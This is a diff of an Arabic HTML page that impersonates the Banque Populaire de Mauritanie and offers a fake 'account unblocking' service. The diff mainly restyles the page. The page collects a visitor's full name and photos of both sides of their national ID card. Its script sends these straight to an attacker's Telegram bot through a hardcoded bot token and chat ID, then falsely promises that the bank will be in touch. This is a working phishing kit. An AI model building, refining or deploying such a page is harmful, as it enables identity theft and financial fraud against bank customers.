@@ -12,113 +12,107 @@
         }
 
         :root {
-            --primary: #8B6914;
-            --secondary: #1a1a2e;
-            --accent: #C9A961;
-            --light: #f5f1e8;
-            --dark: #0f0f0f;
+            --primary-blue: #1B7A8A;
+            --accent-yellow: #F4B860;
+            --success-green: #5CAD56;
+            --light-bg: #F8FAFC;
+            --dark-text: #1A1A1A;
+            --border-gray: #E8EAED;
         }
 
         html, body {
             direction: rtl;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: var(--light-bg);
         }
 
-        #splash {
+        /* ============ SPLASH SCREEN ============ */
+        .splash {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            background: linear-gradient(135deg, var(--primary-blue) 0%, #0E5A6A 100%);
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            color: var(--light);
-            z-index: 1000;
-            animation: fadeIn 0.5s ease-in;
+            color: white;
+            z-index: 2000;
+            opacity: 1;
+            transition: opacity 0.5s ease-out;
         }
 
-        #splash.hide {
-            animation: fadeOut 0.5s ease-out;
-            pointer-events: none;
+        .splash.hidden {
             opacity: 0;
+            pointer-events: none;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+        .splash-content {
+            text-align: center;
+            animation: fadeInUp 0.8s ease-out;
         }
 
-        @keyframes fadeOut {
-            from { opacity: 1; }
-            to { opacity: 0; }
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        .splash-icon {
-            font-size: 64px;
-            margin-bottom: 20px;
-            animation: pulse 2s ease-in-out infinite;
-        }
-
-        .splash-content h1 {
-            font-size: 36px;
-            margin: 20px 0;
-            font-weight: bold;
-        }
-
-        .splash-content p {
-            font-size: 18px;
-            margin-bottom: 10px;
-            color: var(--accent);
-        }
-
-        .splash-dots {
-            margin-top: 40px;
+        .splash-logo {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 30px;
+            background: white;
+            border-radius: 20px;
             display: flex;
-            gap: 10px;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            animation: bounce 2s infinite;
+        }
+
+        .splash-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .splash-subtitle {
+            font-size: 18px;
+            color: var(--accent-yellow);
+            margin-bottom: 40px;
+            font-weight: 500;
+        }
+
+        .splash-partner {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-bottom: 30px;
+        }
+
+        .loading-dots {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
         }
 
         .dot {
-            width: 12px;
-            height: 12px;
+            width: 10px;
+            height: 10px;
             border-radius: 50%;
-            background-color: var(--accent);
-            animation: pulse 1.5s ease-in-out infinite;
+            background: var(--accent-yellow);
+            animation: bounce 1.4s infinite;
         }
 
-        body {
-            background-color: var(--light);
-            padding: 40px 20px;
+        .dot:nth-child(2) {
+            animation-delay: 0.2s;
         }
 
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 15px;
-            padding: 40px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
-            border: 3px solid var(--primary);
-            text-align: right;
-            animation: slideDown 0.6s ease-out;
-            opacity: 0;
+        .dot:nth-child(3) {
+            animation-delay: 0.4s;
         }
 
-        .container.show {
-            opacity: 1;
-        }
-
-        @keyframes slideDown {
+        @keyframes fadeInUp {
             from {
                 opacity: 0;
-                transform: translateY(-20px);
+                transform: translateY(20px);
             }
             to {
                 opacity: 1;
@@ -126,43 +120,99 @@
             }
         }
 
-        .header {
-            text-align: center;
-            margin-bottom: 40px;
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
         }
 
-        .header-icon {
-            font-size: 48px;
+        /* ============ MAIN CONTAINER ============ */
+        .main-container {
+            min-height: 100vh;
+            padding: 20px;
+            opacity: 0;
+            transition: opacity 0.5s ease-in;
+            animation: fadeIn 0.8s ease-in forwards;
+            animation-delay: 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* ============ HEADER ============ */
+        .header {
+            background: white;
+            padding: 30px 20px;
+            border-radius: 0 0 20px 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
             margin-bottom: 15px;
         }
 
-        .header h1 {
+        .header-logo-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, var(--primary-blue), #0E5A6A);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-size: 28px;
-            color: var(--primary);
-            margin: 0 0 10px 0;
-            font-weight: bold;
+            color: white;
         }
 
-        .header p {
-            color: var(--secondary);
+        .header-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--primary-blue);
+            margin-bottom: 8px;
+        }
+
+        .header-subtitle {
             font-size: 14px;
-            margin: 0;
+            color: #666;
+            margin-bottom: 15px;
         }
 
         .header-line {
-            height: 3px;
             width: 60px;
-            background: var(--accent);
-            margin: 15px auto 0;
+            height: 3px;
+            background: var(--accent-yellow);
+            margin: 0 auto;
             border-radius: 2px;
         }
 
+        /* ============ FORM CONTAINER ============ */
+        .form-container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        }
+
+        /* ============ ALERT ============ */
         .alert {
-            padding: 15px;
+            padding: 16px;
+            border-radius: 12px;
             margin-bottom: 20px;
-            border-radius: 8px;
-            display: none;
             font-size: 14px;
+            display: none;
+            animation: slideDown 0.3s ease-out;
         }
 
         .alert.show {
@@ -170,21 +220,33 @@
         }
 
         .alert.success {
-            background-color: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
+            background: #E8F5E9;
+            color: #2E7D32;
+            border: 1px solid #A5D6A7;
         }
 
         .alert.error {
-            background-color: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
+            background: #FFEBEE;
+            color: #C62828;
+            border: 1px solid #EF9A9A;
         }
 
-        form {
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* ============ FORM ============ */
+        .form {
             display: flex;
             flex-direction: column;
-            gap: 25px;
+            gap: 24px;
         }
 
         .form-group {
@@ -192,243 +254,328 @@
             flex-direction: column;
         }
 
-        .form-group label {
-            margin-bottom: 10px;
-            color: var(--primary);
-            font-weight: bold;
+        .form-label {
             font-size: 16px;
-        }
-
-        .form-group small {
-            color: #666;
-            font-size: 12px;
-            margin-top: 5px;
-        }
-
-        input[type="text"],
-        input[type="date"],
-        input[type="file"] {
-            padding: 12px 15px;
-            border: 2px solid var(--accent);
-            border-radius: 8px;
-            font-size: 14px;
-            font-family: inherit;
-            transition: border-color 0.3s;
-        }
-
-        input[type="text"]:focus,
-        input[type="date"]:focus {
-            outline: none;
-            border-color: var(--primary);
-        }
-
-        .file-input-wrapper {
-            border: 2px dashed var(--accent);
-            border-radius: 8px;
-            padding: 20px;
-            text-align: center;
-            background-color: #fafafa;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .file-input-wrapper:hover {
-            border-color: var(--primary);
-            background-color: #f0f0f0;
-        }
-
-        .file-input-wrapper input {
-            display: none;
-        }
-
-        .file-input-wrapper label {
-            cursor: pointer;
-            display: block;
-            margin: 0;
-        }
-
-        .file-input-wrapper .icon {
-            font-size: 32px;
+            font-weight: 600;
+            color: var(--primary-blue);
             margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
-        .file-input-wrapper p {
-            margin: 0 0 5px 0;
-            color: var(--secondary);
+        .form-label-number {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 28px;
+            height: 28px;
+            background: var(--accent-yellow);
+            border-radius: 50%;
+            color: var(--primary-blue);
+            font-weight: 700;
+            font-size: 14px;
         }
 
-        .file-input-wrapper small {
+        /* ============ INPUT TEXT ============ */
+        .form-input {
+            padding: 14px 16px;
+            border: 2px solid var(--border-gray);
+            border-radius: 10px;
+            font-size: 15px;
+            font-family: inherit;
+            transition: all 0.3s ease;
+            color: var(--dark-text);
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 3px rgba(27, 122, 138, 0.1);
+        }
+
+        .form-input::placeholder {
             color: #999;
         }
 
-        button {
-            padding: 15px 30px;
-            background: linear-gradient(135deg, var(--primary), var(--accent));
+        /* ============ FILE INPUT ============ */
+        .file-input-wrapper {
+            border: 2px dashed var(--accent-yellow);
+            border-radius: 12px;
+            padding: 24px;
+            text-align: center;
+            background: rgba(244, 184, 96, 0.05);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .file-input-wrapper:hover {
+            border-color: var(--primary-blue);
+            background: rgba(27, 122, 138, 0.05);
+        }
+
+        .file-input-wrapper input[type="file"] {
+            display: none;
+        }
+
+        .file-input-label {
+            cursor: pointer;
+            display: block;
+        }
+
+        .file-input-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+
+        .file-input-text {
+            font-size: 15px;
+            color: var(--primary-blue);
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+
+        .file-input-name {
+            font-size: 13px;
+            color: #999;
+        }
+
+        /* ============ BUTTON ============ */
+        .submit-btn {
+            padding: 16px 24px;
+            background: linear-gradient(135deg, var(--primary-blue) 0%, #0E5A6A 100%);
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 10px;
             font-size: 16px;
-            font-weight: bold;
+            font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(139, 105, 20, 0.3);
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(27, 122, 138, 0.3);
             margin-top: 10px;
         }
 
-        button:hover:not(:disabled) {
-            box-shadow: 0 6px 20px rgba(139, 105, 20, 0.4);
+        .submit-btn:hover:not(:disabled) {
             transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(27, 122, 138, 0.4);
         }
 
-        button:disabled {
+        .submit-btn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .submit-btn:disabled {
             opacity: 0.7;
             cursor: not-allowed;
         }
 
+        /* ============ FOOTER ============ */
         .footer {
+            text-align: center;
             margin-top: 30px;
             padding-top: 20px;
-            border-top: 1px solid var(--accent);
-            text-align: center;
-            font-size: 12px;
+            border-top: 1px solid var(--border-gray);
+            font-size: 13px;
             color: #999;
         }
 
-        .footer p {
+        .footer-text {
             margin: 5px 0;
         }
 
+        /* ============ RESPONSIVE ============ */
         @media (max-width: 600px) {
-            .container {
+            .form-container {
                 padding: 20px;
+                border-radius: 15px;
             }
 
-            .header h1 {
+            .header-title {
                 font-size: 24px;
             }
 
-            input, button {
+            .header {
+                padding: 20px;
+            }
+
+            .form-input,
+            .submit-btn {
                 font-size: 16px;
             }
         }
     </style>
 </head>
 <body>
-    <div id="splash">
+    <!-- SPLASH SCREEN -->
+    <div class="splash" id="splash">
         <div class="splash-content">
-            <div class="splash-icon">🏦</div>
-            <h1>البنك الشعبي الموريتاني</h1>
-            <p>خدمة فك الحظر</p>
-            <p style="font-size: 14px; margin-top: 30px;">بالشراكة مع الصيرفية الموريتانية الكبرى</p>
-        </div>
-        <div class="splash-dots">
-            <div class="dot"></div>
-            <div class="dot" style="animation-delay: 0.3s;"></div>
-            <div class="dot" style="animation-delay: 0.6s;"></div>
+            <div class="splash-logo">🏦</div>
+            <h1 class="splash-title">البنك الشعبي الموريتاني</h1>
+            <p class="splash-subtitle">خدمة فك الحظر</p>
+            <p class="splash-partner">Banque Populaire de Mauritanie</p>
+            <div class="loading-dots">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
         </div>
     </div>
 
-    <div class="container" id="container">
+    <!-- MAIN CONTENT -->
+    <div class="main-container" id="mainContainer">
+        <!-- HEADER -->
         <div class="header">
-            <div class="header-icon">🏦</div>
-            <h1>خدمة فك الحظر</h1>
-            <p>البنك الشعبي الموريتاني</p>
+            <div class="header-logo">
+                <div class="header-logo-icon">🏦</div>
+            </div>
+            <h1 class="header-title">خدمة فك الحظر</h1>
+            <p class="header-subtitle">البنك الشعبي الموريتاني</p>
             <div class="header-line"></div>
         </div>
 
-        <div class="alert" id="alert"></div>
+        <!-- FORM -->
+        <div class="form-container">
+            <div class="alert" id="alert"></div>
 
-        <form id="form">
-            <div class="form-group">
-                <label>1️⃣ الاسم الكامل</label>
-                <input 
-                    type="text" 
-                    id="fullName" 
-                    placeholder="أدخل اسمك الكامل (بدون أرقام)"
-                    required
-                >
-                <small>ملاحظة: سيتم حظر الأرقام تلقائياً</small>
-            </div>
-
-            <div class="form-group">
-                <label>2️⃣ صورة بطاقة التعريف (من الأمام)</label>
-                <div class="file-input-wrapper">
-                    <input type="file" id="idFront" accept="image/*" required>
-                    <label for="idFront">
-                        <div class="icon">📸</div>
-                        <p>انقر لاختيار الصورة</p>
-                        <small id="idFrontName">لم يتم اختيار صورة</small>
+            <form class="form" id="form">
+                <!-- FIELD 1: FULL NAME -->
+                <div class="form-group">
+                    <label class="form-label">
+                        <span class="form-label-number">1</span>
+                        الاسم الكامل
                     </label>
+                    <input
+                        type="text"
+                        class="form-input"
+                        id="fullName"
+                        placeholder="أدخل اسمك الكامل"
+                        required
+                    >
+                    <small style="color: #999; margin-top: 5px; font-size: 13px;">
+                        ملاحظة: سيتم حظر الأرقام تلقائياً
+                    </small>
                 </div>
-            </div>
 
-            <div class="form-group">
-                <label>3️⃣ صورة بطاقة التعريف (من الخلف)</label>
-                <div class="file-input-wrapper">
-                    <input type="file" id="idBack" accept="image/*" required>
-                    <label for="idBack">
-                        <div class="icon">📸</div>
-                        <p>انقر لاختيار الصورة</p>
-                        <small id="idBackName">لم يتم اختيار صورة</small>
+                <!-- FIELD 2: ID FRONT -->
+                <div class="form-group">
+                    <label class="form-label">
+                        <span class="form-label-number">2</span>
+                        صورة بطاقة التعريف (الأمام)
                     </label>
+                    <div class="file-input-wrapper">
+                        <input
+                            type="file"
+                            id="idFront"
+                            accept="image/*"
+                            required
+                        >
+                        <label for="idFront" class="file-input-label">
+                            <div class="file-input-icon">📸</div>
+                            <div class="file-input-text">اضغط لاختيار الصورة</div>
+                            <div class="file-input-name" id="idFrontName">
+                                لم يتم اختيار صورة
+                            </div>
+                        </label>
+                    </div>
                 </div>
+
+                <!-- FIELD 3: ID BACK -->
+                <div class="form-group">
+                    <label class="form-label">
+                        <span class="form-label-number">3</span>
+                        صورة بطاقة التعريف (الخلف)
+                    </label>
+                    <div class="file-input-wrapper">
+                        <input
+                            type="file"
+                            id="idBack"
+                            accept="image/*"
+                            required
+                        >
+                        <label for="idBack" class="file-input-label">
+                            <div class="file-input-icon">📸</div>
+                            <div class="file-input-text">اضغط لاختيار الصورة</div>
+                            <div class="file-input-name" id="idBackName">
+                                لم يتم اختيار صورة
+                            </div>
+                        </label>
+                    </div>
+                </div>
+
+                <!-- FIELD 4: DATE -->
+                <div class="form-group">
+                    <label class="form-label">
+                        <span class="form-label-number">4</span>
+                        تاريخ المشكلة
+                    </label>
+                    <input
+                        type="date"
+                        class="form-input"
+                        id="problemDate"
+                        required
+                    >
+                    <small style="color: #999; margin-top: 5px; font-size: 13px;">
+                        ملاحظة: اختر التاريخ من التقويم
+                    </small>
+                </div>
+
+                <!-- SUBMIT BUTTON -->
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    ✅ إرسال الطلب
+                </button>
+            </form>
+
+            <!-- FOOTER -->
+            <div class="footer">
+                <p class="footer-text">🤝 بالشراكة مع البنك الشعبي الموريتاني</p>
+                <p class="footer-text">© 2024 جميع الحقوق محفوظة</p>
             </div>
-
-            <div class="form-group">
-                <label>4️⃣ تاريخ المشكلة</label>
-                <input 
-                    type="date" 
-                    id="problemDate" 
-                    required
-                >
-                <small>ملاحظة: سيتم قبول الأرقام فقط</small>
-            </div>
-
-            <button type="submit" id="submitBtn">✅ إرسال الطلب</button>
-        </form>
-
-        <div class="footer">
-            <p>🤝 بالشراكة مع الصيرفية الموريتانية الكبرى</p>
-            <p>© 2024 البنك الشعبي الموريتاني - جميع الحقوق محفوظة</p>
         </div>
     </div>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || '8831199692:AAGfkkFM×jtMaYsA9KLZFUiw_dlu7LjxEf8';
-        const TELEGRAM_CHAT_ID = process.env.REACT_APP_TELEGRAM_CHAT_ID || '8665814266';
+        // Configuration
+        const TELEGRAM_BOT_TOKEN = '8831199692:AAGfkkFM×jtMaYsA9KLZFUiw_dlu7LjxEf8';
+        const TELEGRAM_CHAT_ID = '8665814266';
 
+        // Hide splash after 3 seconds
         setTimeout(() => {
-            document.getElementById('splash').classList.add('hide');
-            document.getElementById('container').classList.add('show');
+            const splash = document.getElementById('splash');
+            splash.classList.add('hidden');
         }, 3000);
 
+        // Block numbers in full name field
         document.getElementById('fullName').addEventListener('input', function(e) {
             this.value = this.value.replace(/[0-9]/g, '');
         });
 
+        // Handle file input - ID Front
         document.getElementById('idFront').addEventListener('change', function(e) {
-            const name = e.target.files[0]?.name || 'لم يتم اختيار صورة';
-            document.getElementById('idFrontName').textContent = name;
+            const fileName = e.target.files[0]?.name || 'لم يتم اختيار صورة';
+            document.getElementById('idFrontName').textContent = fileName;
         });
 
+        // Handle file input - ID Back
         document.getElementById('idBack').addEventListener('change', function(e) {
-            const name = e.target.files[0]?.name || 'لم يتم اختيار صورة';
-            document.getElementById('idBackName').textContent = name;
+            const fileName = e.target.files[0]?.name || 'لم يتم اختيار صورة';
+            document.getElementById('idBackName').textContent = fileName;
         });
 
-        function showAlert(message, type = 'info') {
+        // Show alert function
+        function showAlert(message, type) {
             const alert = document.getElementById('alert');
             alert.textContent = message;
             alert.className = `alert show ${type}`;
-            
+
             if (type === 'success') {
                 setTimeout(() => {
                     alert.classList.remove('show');
-                }, 5000);
+                }, 4000);
             }
         }
 
-        document.getElementById('form').addEventListener('submit', async (e) => {
+        // Form submission
+        document.getElementById('form').addEventListener('submit', async function(e) {
             e.preventDefault();
 
             const fullName = document.getElementById('fullName').value.trim();
@@ -437,58 +584,67 @@
             const problemDate = document.getElementById('problemDate').value;
             const submitBtn = document.getElementById('submitBtn');
 
+            // Validation
             if (!fullName) {
-                showAlert('يرجى إدخال الاسم الكامل', 'error');
-                return;
-            }
-            if (!idFront) {
-                showAlert('يرجى تحميل صورة بطاقة التعريف من الأمام', 'error');
-                return;
-            }
-            if (!idBack) {
-                showAlert('يرجى تحميل صورة بطاقة التعريف من الخلف', 'error');
-                return;
-            }
-            if (!problemDate) {
-                showAlert('يرجى إدخال تاريخ المشكلة', 'error');
+                showAlert('❌ يرجى إدخال الاسم الكامل', 'error');
                 return;
             }
 
+            if (!idFront) {
+                showAlert('❌ يرجى تحميل صورة بطاقة التعريف من الأمام', 'error');
+                return;
+            }
+
+            if (!idBack) {
+                showAlert('❌ يرجى تحميل صورة بطاقة التعريف من الخلف', 'error');
+                return;
+            }
+
+            if (!problemDate) {
+                showAlert('❌ يرجى إدخال تاريخ المشكلة', 'error');
+                return;
+            }
+
+            // Disable button
             submitBtn.disabled = true;
             submitBtn.textContent = '⏳ جاري الإرسال...';
 
             try {
-                const textMessage = `
+                // Prepare message
+                const message = `
 🏦 طلب فك حظر جديد
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━
 👤 الاسم الكامل: ${fullName}
 📅 تاريخ المشكلة: ${problemDate}
-📱 من: البنك الشعبي الموريتاني
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+🏢 البنك: البنك الشعبي الموريتاني
+━━━━━━━━━━━━━━━━━━━━━━━━
                 `;
 
-                const messageResponse = await fetch(
+                // Send text message
+                const msgResponse = await fetch(
                     `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                     {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             chat_id: TELEGRAM_CHAT_ID,
-                            text: textMessage
+                            text: message,
+                            parse_mode: 'HTML'
                         })
                     }
                 );
 
-                if (!messageResponse.ok) {
-                    throw new Error('خطأ في الرسالة النصية');
+                if (!msgResponse.ok) {
+                    throw new Error('فشل إرسال الرسالة');
                 }
 
+                // Send front image
                 const formData1 = new FormData();
                 formData1.append('chat_id', TELEGRAM_CHAT_ID);
                 formData1.append('photo', idFront);
                 formData1.append('caption', '📷 صورة بطاقة التعريف (الأمام)');
 
-                const photoResponse1 = await fetch(
+                const photoRes1 = await fetch(
                     `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
                     {
                         method: 'POST',
@@ -496,16 +652,17 @@
                     }
                 );
 
-                if (!photoResponse1.ok) {
-                    throw new Error('خطأ في الصورة الأمامية');
+                if (!photoRes1.ok) {
+                    throw new Error('فشل إرسال الصورة الأولى');
                 }
 
+                // Send back image
                 const formData2 = new FormData();
                 formData2.append('chat_id', TELEGRAM_CHAT_ID);
                 formData2.append('photo', idBack);
                 formData2.append('caption', '📷 صورة بطاقة التعريف (الخلف)');
 
-                const photoResponse2 = await fetch(
+                const photoRes2 = await fetch(
                     `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
                     {
                         method: 'POST',
@@ -513,19 +670,21 @@
                     }
                 );
 
-                if (!photoResponse2.ok) {
-                    throw new Error('خطأ في الصورة الخلفية');
+                if (!photoRes2.ok) {
+                    throw new Error('فشل إرسال الصورة الثانية');
                 }
 
-                showAlert('تم إرسال طلبك بنجاح! سيتم التواصل معك قريباً', 'success');
+                // Success
+                showAlert('✅ تم إرسال طلبك بنجاح! سيتم التواصل معك قريباً', 'success');
 
+                // Reset form
                 document.getElementById('form').reset();
                 document.getElementById('idFrontName').textContent = 'لم يتم اختيار صورة';
                 document.getElementById('idBackName').textContent = 'لم يتم اختيار صورة';
 
             } catch (error) {
-                console.error('خطأ:', error);
-                showAlert('حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى', 'error');
+                console.error('Error:', error);
+                showAlert('❌ حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى', 'error');
             } finally {
                 submitBtn.disabled = false;
                 submitBtn.textContent = '✅ إرسال الطلب';
